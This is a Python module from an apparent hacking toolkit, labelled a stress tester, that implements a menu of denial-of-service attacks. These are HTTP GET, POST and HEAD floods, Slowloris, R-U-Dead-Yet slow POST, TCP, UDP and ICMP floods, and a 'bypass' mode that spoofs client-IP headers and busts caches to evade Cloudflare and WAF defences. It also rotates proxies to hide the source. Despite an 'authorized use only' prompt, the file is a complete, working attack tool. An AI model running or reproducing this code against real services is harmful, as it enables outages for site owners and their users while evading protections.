# -*- coding: utf-8 -*-
"""
MEOW-SEC :: STRESS — Load & Stress Testing
  · L7 HTTP  (GET, POST, Slowloris)
  · L4 TCP   (connection flood)
  · L4 UDP   (packet flood)
  · ICMP     (subprocess ping flood)
  · Proxy rotation intégrée
  Use ONLY on systems you own or have explicit written permission to test.
"""
import os, sys, time, socket, threading, random, string
import concurrent.futures
from datetime import datetime
from urllib.parse import urlparse

from core.ui import (console, show_module_banner, ok, err, info, warn, find,
                     ask_choice, G1, G2, CY, OR, RD, DM)
from core.cats import cat_talk, CAT_SCAN, CAT_HACKER
from rich.panel   import Panel
from rich.table   import Table
from rich.text    import Text
from rich.align   import Align
from rich.prompt  import Prompt, IntPrompt, Confirm
from rich.live    import Live
from rich.layout  import Layout
from rich         import box
from rich.rule    import Rule

try:
    import requests as _req
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# ─── STAT BLOCK ──────────────────────────────────────────────

class Stats:
    def __init__(self):
        self._lock      = threading.Lock()
        self.sent       = 0
        self.ok         = 0
        self.fail       = 0
        self.bytes_sent = 0
        self.latencies  = []
        self.start      = time.time()

    def hit(self, success: bool, latency_ms: float = 0, nbytes: int = 0):
        with self._lock:
            self.sent += 1
            if success: self.ok += 1
            else:        self.fail += 1
            if latency_ms > 0: self.latencies.append(latency_ms)
            self.bytes_sent += nbytes

    @property
    def elapsed(self) -> float:
        return max(time.time() - self.start, 0.001)

    @property
    def rps(self) -> float:
        return self.sent / self.elapsed

    @property
    def avg_ms(self) -> float:
        if not self.latencies: return 0.0
        return sum(self.latencies) / len(self.latencies)

    def render_table(self, target: str, method: str, running: bool) -> Table:
        t = Table(box=box.MINIMAL_DOUBLE_HEAD, border_style=G2,
                  header_style=CY, show_lines=False, expand=True)
        t.add_column("Metric",  style=CY, width=18)
        t.add_column("Value",   style=G1)

        status = f"[bold {G1}]● RUNNING[/]" if running else f"[bold {OR}]■ STOPPED[/]"
        t.add_row("Target",     target)
        t.add_row("Method",     f"[bold {OR}]{method}[/]")
        t.add_row("Status",     status)
        t.add_row("Elapsed",    f"{self.elapsed:.1f}s")
        t.add_row("Requests",   f"[bold {G1}]{self.sent:,}[/]")
        t.add_row("Success",    f"[{G1}]{self.ok:,}[/]")
        t.add_row("Failed",     f"[{RD}]{self.fail:,}[/]")
        t.add_row("RPS",        f"[bold {G1}]{self.rps:,.1f}[/]")
        t.add_row("Avg latency",f"{self.avg_ms:.1f} ms")
        t.add_row("Data sent",  _fmt_bytes(self.bytes_sent))
        return t

def _fmt_bytes(n: int) -> str:
    if n < 1024:      return f"{n} B"
    if n < 1048576:   return f"{n/1024:.1f} KB"
    return                  f"{n/1048576:.2f} MB"

# ─── STOP FLAG ───────────────────────────────────────────────

_STOP = threading.Event()

# ─── L7 HTTP GET ─────────────────────────────────────────────

def _worker_http_get(url: str, stats: Stats, proxy: dict | None, ua_list: list):
    session = _req.Session()
    headers = {"User-Agent": random.choice(ua_list),
               "Accept": "*/*", "Cache-Control": "no-cache"}
    while not _STOP.is_set():
        t0 = time.perf_counter()
        try:
            r = session.get(url, headers=headers, proxies=proxy,
                            timeout=10, allow_redirects=False)
            lat = (time.perf_counter() - t0) * 1000
            stats.hit(200 <= r.status_code < 500, lat, len(r.content))
        except Exception:
            stats.hit(False)

# ─── L7 HTTP POST ────────────────────────────────────────────

def _worker_http_post(url: str, stats: Stats, proxy: dict | None, ua_list: list):
    session = _req.Session()
    headers = {"User-Agent": random.choice(ua_list),
               "Content-Type": "application/x-www-form-urlencoded"}
    while not _STOP.is_set():
        body = _rand_str(random.randint(64, 512)).encode()
        t0 = time.perf_counter()
        try:
            r = session.post(url, data=body, headers=headers, proxies=proxy,
                             timeout=10, allow_redirects=False)
            lat = (time.perf_counter() - t0) * 1000
            stats.hit(200 <= r.status_code < 500, lat, len(body))
        except Exception:
            stats.hit(False)

# ─── L7 SLOWLORIS ────────────────────────────────────────────

def _worker_slowloris(host: str, port: int, stats: Stats):
    """Ouvre des connexions HTTP partielles et les maintient ouvertes"""
    sockets = []
    while not _STOP.is_set():
        # Ouvrir de nouvelles connexions
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, port))
            # Envoyer des headers HTTP incomplets
            s.send(f"GET /?{_rand_str(8)} HTTP/1.1\r\nHost: {host}\r\n".encode())
            sockets.append(s)
            stats.hit(True, nbytes=64)
        except Exception:
            stats.hit(False)

        # Envoyer des headers partiels pour garder les connexions vivantes
        dead = []
        for s in sockets:
            try:
                s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
            except Exception:
                dead.append(s)
        for s in dead:
            try: s.close()
            except: pass
            sockets.remove(s)

        time.sleep(random.uniform(0.5, 1.5))

    for s in sockets:
        try: s.close()
        except: pass

# ─── L7 HTTP HEAD ────────────────────────────────────────────

def _worker_http_head(url: str, stats: Stats, proxy: dict | None, ua_list: list):
    """HEAD flood — plus léger qu'un GET, pas de body dans la réponse"""
    session = _req.Session()
    while not _STOP.is_set():
        headers = {"User-Agent": random.choice(ua_list)}
        t0 = time.perf_counter()
        try:
            r = session.head(url + f"?{_rand_str(6)}={_rand_str(8)}",
                             headers=headers, proxies=proxy,
                             timeout=10, allow_redirects=False)
            lat = (time.perf_counter() - t0) * 1000
            stats.hit(r.status_code < 500, lat)
        except Exception:
            stats.hit(False)

# ─── L7 BYPASS (MHX-style) ───────────────────────────────────

def _bypass_headers(ua_list: list) -> dict:
    """Headers style MHX : IP spoofing + cache bypass + referrers réalistes"""
    fake_ip  = ".".join(str(random.randint(1,254)) for _ in range(4))
    referrers = [
        "https://www.google.com/", "https://www.bing.com/",
        "https://t.co/", "https://www.reddit.com/", "https://duckduckgo.com/",
    ]
    return {
        "User-Agent":       random.choice(ua_list),
        "X-Forwarded-For":  fake_ip,
        "X-Real-IP":        fake_ip,
        "CF-Connecting-IP": fake_ip,
        "True-Client-IP":   fake_ip,
        "X-Originating-IP": fake_ip,
        "Referer":          random.choice(referrers),
        "Cache-Control":    "no-cache, no-store",
        "Pragma":           "no-cache",
        "Accept":           "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language":  "en-US,en;q=0.5",
        "Accept-Encoding":  "gzip, deflate",
        "Connection":       "keep-alive",
        "DNT":              "1",
    }

def _worker_http_bypass(url: str, stats: Stats, proxy: dict | None, ua_list: list):
    """HTTP bypass : cache bust + IP spoofing headers + UA rotation"""
    session = _req.Session()
    while not _STOP.is_set():
        # Cache-busting aléatoire dans le path
        cache_buster = f"?_={int(time.time()*1000)}&cb={_rand_str(8)}"
        headers = _bypass_headers(ua_list)
        t0 = time.perf_counter()
        try:
            r = session.get(url + cache_buster, headers=headers, proxies=proxy,
                            timeout=10, allow_redirects=False)
            lat = (time.perf_counter() - t0) * 1000
            stats.hit(r.status_code < 500, lat, len(r.content))
        except Exception:
            stats.hit(False)

# ─── L7 RUDY (R-U-Dead-Yet) ──────────────────────────────────

def _worker_rudy(host: str, port: int, path: str, stats: Stats):
    """
    R-U-Dead-Yet : POST avec Content-Length énorme,
    envoie le body 1 octet à la fois → épuise les threads worker du serveur.
    """
    while not _STOP.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30)
            s.connect((host, port))

            body_len = random.randint(100000, 999999)
            ua = random.choice(UA_LIST)
            req = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {body_len}\r\n"
                f"Connection: keep-alive\r\n\r\n"
            )
            s.send(req.encode())
            stats.hit(True, nbytes=len(req))

            # Envoie le body très lentement
            sent = 0
            while sent < body_len and not _STOP.is_set():
                chunk = _rand_str(1).encode()
                s.send(chunk)
                sent += 1
                stats.hit(True, nbytes=1)
                time.sleep(random.uniform(0.05, 0.2))
            s.close()
        except Exception:
            stats.hit(False)
            time.sleep(0.5)

# ─── L4 TCP ──────────────────────────────────────────────────

def _worker_tcp(host: str, port: int, stats: Stats):
    """Connexions TCP rapides (connection flood)"""
    while not _STOP.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            t0 = time.perf_counter()
            s.connect((host, port))
            lat = (time.perf_counter() - t0) * 1000
            stats.hit(True, lat)
            s.close()
        except Exception:
            stats.hit(False)

# ─── L4 UDP ──────────────────────────────────────────────────

def _worker_udp(host: str, port: int, stats: Stats):
    """Paquets UDP aléatoires"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not _STOP.is_set():
        try:
            payload = os.urandom(random.randint(64, 1024))
            sock.sendto(payload, (host, port))
            stats.hit(True, nbytes=len(payload))
        except Exception:
            stats.hit(False)
    sock.close()

# ─── ICMP FLOOD ──────────────────────────────────────────────

def _worker_icmp(host: str, stats: Stats):
    """ICMP flood via subprocess (pas de raw socket requis)"""
    import subprocess
    while not _STOP.is_set():
        try:
            cmd = ["ping", "-n", "1", "-w", "500", host] if os.name == "nt" \
                  else ["ping", "-c", "1", "-W", "1", host]
            r = subprocess.run(cmd, capture_output=True, timeout=3)
            stats.hit(r.returncode == 0)
        except Exception:
            stats.hit(False)

# ─── UTILS ───────────────────────────────────────────────────

def _rand_str(n: int) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/123.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "curl/8.5.0",
    "python-requests/2.31.0",
    "Go-http-client/1.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

def _parse_target(target: str) -> tuple[str, int, str]:
    """Retourne (host, port, url_full)"""
    if "://" not in target:
        target = "http://" + target
    p = urlparse(target)
    host = p.hostname or target
    port = p.port or (443 if p.scheme == "https" else 80)
    return host, port, target

def _get_proxy() -> dict | None:
    try:
        from core.proxy_manager import get_manager
        mgr = get_manager()
        return mgr.get_dict()
    except Exception:
        return None

# ─── LIVE DISPLAY ────────────────────────────────────────────

def _run_attack(target: str, method: str, workers: int, duration: int, use_proxy: bool):
    stats = Stats()
    _STOP.clear()

    host, port, url = _parse_target(target)
    proxy = _get_proxy() if use_proxy else None

    # Lancer les workers
    threads = []
    for _ in range(workers):
        parsed_path = urlparse(url).path or "/"
        if method == "HTTP_GET":
            t = threading.Thread(target=_worker_http_get,
                                 args=(url, stats, proxy, UA_LIST), daemon=True)
        elif method == "HTTP_POST":
            t = threading.Thread(target=_worker_http_post,
                                 args=(url, stats, proxy, UA_LIST), daemon=True)
        elif method == "HTTP_HEAD":
            t = threading.Thread(target=_worker_http_head,
                                 args=(url, stats, proxy, UA_LIST), daemon=True)
        elif method == "HTTP_BYPASS":
            t = threading.Thread(target=_worker_http_bypass,
                                 args=(url, stats, proxy, UA_LIST), daemon=True)
        elif method == "SLOWLORIS":
            t = threading.Thread(target=_worker_slowloris,
                                 args=(host, port, stats), daemon=True)
        elif method == "RUDY":
            t = threading.Thread(target=_worker_rudy,
                                 args=(host, port, parsed_path, stats), daemon=True)
        elif method == "TCP":
            t = threading.Thread(target=_worker_tcp,
                                 args=(host, port, stats), daemon=True)
        elif method == "UDP":
            t = threading.Thread(target=_worker_udp,
                                 args=(host, port, stats), daemon=True)
        elif method == "ICMP":
            t = threading.Thread(target=_worker_icmp,
                                 args=(host, stats), daemon=True)
        else:
            continue
        t.start()
        threads.append(t)

    info(f"[{G1}]{len(threads)}[/] workers launched — press Ctrl+C or wait {duration}s")
    console.print()

    end_time = time.time() + duration
    try:
        with Live(console=console, refresh_per_second=4) as live:
            while time.time() < end_time and not _STOP.is_set():
                remaining = max(0, end_time - time.time())
                tbl = stats.render_table(target, method, True)
                panel = Panel(
                    tbl,
                    title=f"[bold {RD}]◈ MEOW-STRESS :: {method} ◈  [{OR}]{remaining:.0f}s remaining[/]",
                    border_style=RD
                )
                live.update(panel)
                time.sleep(0.25)
    except KeyboardInterrupt:
        pass
    finally:
        _STOP.set()

    # Résumé final
    console.print()
    console.print(Panel(
        stats.render_table(target, method, False),
        title=f"[bold {G1}]◈ ATTACK COMPLETE ◈",
        border_style=G2
    ))

    # Sauvegarde
    _save_results(target, method, stats, workers, duration)

def _save_results(target, method, stats: Stats, workers, duration):
    from datetime import datetime
    os.makedirs("data", exist_ok=True)
    fname = f"data/stress_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    import json
    data = {
        "target": target, "method": method,
        "workers": workers, "duration_s": duration,
        "total": stats.sent, "success": stats.ok, "failed": stats.fail,
        "rps": round(stats.rps, 2),
        "avg_latency_ms": round(stats.avg_ms, 2),
        "bytes_sent": stats.bytes_sent,
        "timestamp": datetime.now().isoformat()
    }
    with open(fname, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)
    ok(f"Results saved: [bold]{fname}[/]")

# ─── MAIN RUN ────────────────────────────────────────────────

METHODS = {
    "1": ("HTTP_GET",    "L7  · HTTP GET flood     (web server)"),
    "2": ("HTTP_POST",   "L7  · HTTP POST flood    (forms / APIs)"),
    "3": ("HTTP_HEAD",   "L7  · HTTP HEAD flood    (lightweight, fast)"),
    "4": ("HTTP_BYPASS", "L7  · Bypass mode        (CF/WAF + IP spoof + cache bust)"),
    "5": ("SLOWLORIS",   "L7  · Slowloris          (connection exhaustion)"),
    "6": ("RUDY",        "L7  · R-U-Dead-Yet       (slow POST body, 1 byte/tick)"),
    "7": ("TCP",         "L4  · TCP flood          (connection flood)"),
    "8": ("UDP",         "L4  · UDP flood          (stateless packet flood)"),
    "9": ("ICMP",        "L3  · ICMP flood         (ping flood / network layer)"),
}

def run():
    show_module_banner("stress")
    cat_talk(CAT_HACKER, "Stress testing engine loaded.", OR)
    console.print()

    # Avertissement légal
    warn("AUTHORIZED USE ONLY — Unauthorized stress testing is illegal.")
    warn("Use only on systems YOU OWN or have EXPLICIT WRITTEN PERMISSION to test.")
    console.print()
    if not Confirm.ask(f"  [{OR}]◈ I confirm this is an authorized target[/]",
                       default=False):
        info("Aborted."); return

    console.print()

    while True:
        console.print(Rule(f"[{G1}] STRESS TEST — METHOD ", style=G2))
        console.print(f"  [{DM}]── Application Layer (L7) ─────────────[/]")
        for k in ("1","2","3","4","5","6"):
            method, desc = METHODS[k]
            console.print(f"  [{G1}][{k}][/] {desc}")
        console.print(f"  [{DM}]── Transport Layer (L4) ────────────────[/]")
        for k in ("7","8"):
            method, desc = METHODS[k]
            console.print(f"  [{G1}][{k}][/] {desc}")
        console.print(f"  [{DM}]── Network Layer (L3) ──────────────────[/]")
        for k in ("9",):
            method, desc = METHODS[k]
            console.print(f"  [{G1}][{k}][/] {desc}")
        console.print(f"  [{G1}][0][/] Back")
        console.print()
        choice = ask_choice("Method", "0")
        if choice == "0": break
        if choice not in METHODS:
            warn("Invalid choice"); continue

        method, _ = METHODS[choice]
        console.print()

        # Target
        target = Prompt.ask(f"  [{G1}]◈ Target (IP / URL / domain)[/]").strip()
        if not target: continue

        # Workers
        default_workers = 50 if method in ("HTTP_GET","HTTP_POST","TCP") else 20
        try:
            workers = IntPrompt.ask(f"  [{G1}]◈ Workers[/]", default=default_workers)
            workers = max(1, min(workers, 500))
        except Exception:
            workers = default_workers

        # Duration
        try:
            duration = IntPrompt.ask(f"  [{G1}]◈ Duration (seconds)[/]", default=30)
            duration = max(5, min(duration, 300))
        except Exception:
            duration = 30

        # Proxy
        use_proxy = False
        if HAS_REQUESTS and method in ("HTTP_GET","HTTP_POST","HTTP_HEAD","HTTP_BYPASS"):
            use_proxy = Confirm.ask(f"  [{OR}]◈ Use proxy rotation?[/]", default=False)

        if method in ("HTTP_GET","HTTP_POST","HTTP_HEAD","HTTP_BYPASS","SLOWLORIS","RUDY") \
                and not HAS_REQUESTS and method != "SLOWLORIS" and method != "RUDY":
            err("requests library required for HTTP methods."); continue

        console.print()
        info(f"Target: [{CY}]{target}[/]  Method: [{OR}]{method}[/]  "
             f"Workers: [{G1}]{workers}[/]  Duration: [{G1}]{duration}s[/]")
        console.print()

        _run_attack(target, method, workers, duration, use_proxy)
        console.print()

def _banner():
    logo = Text(r"""
 ███████╗████████╗██████╗ ███████╗███████╗███████╗
 ██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝
 ███████╗   ██║   ██████╔╝█████╗  ███████╗███████╗
 ╚════██║   ██║   ██╔══██╗██╔══╝  ╚════██║╚════██║
 ███████║   ██║   ██║  ██║███████╗███████║███████║
 ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
     [L4 · L7 · ICMP · PROXY ROTATION]""", style=f"bold {RD}")
    console.print(Panel(Align(logo, align="center"), border_style=RD, padding=(0,1)))
